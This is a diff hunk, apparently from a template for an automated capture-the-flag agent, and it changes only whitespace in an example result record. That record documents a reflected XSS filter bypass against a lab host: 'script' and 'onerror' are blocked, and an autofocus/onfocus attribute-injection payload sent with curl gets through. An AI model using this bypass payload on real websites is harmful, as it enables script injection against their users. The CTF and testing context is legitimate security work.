@@ -123,7 +123,7 @@ Patterns to watch: FLAG, flag, ctf, secret key, hidden value
 <result>
   <status>success</status>
   <task_summary>XSS via attribute injection bypass - used autofocus/onfocus</task_summary>
-  
+
   <attempts>
     <attempt seq="1" status="success">
       <action>curl -s http://192.168.64.1/</action>
@@ -146,13 +146,13 @@ Patterns to watch: FLAG, flag, ctf, secret key, hidden value
       <insight>Attribute injection with autofocus/onfocus bypassed filter</insight>
     </attempt>
   </attempts>
-  
+
   <findings>
     <finding type="flag">FLAG{abc123}</finding>
     <finding type="filter">Blocked: script, onerror</finding>
     <finding type="bypass">Allowed: autofocus, onfocus, attribute injection</finding>
   </findings>
-  
+
   <successful_payload>curl -s "http://192.168.64.1/page?name=test\"&gt;&lt;input/autofocus/onfocus=alert(1)&gt;"</successful_payload>
 </result>
 ```
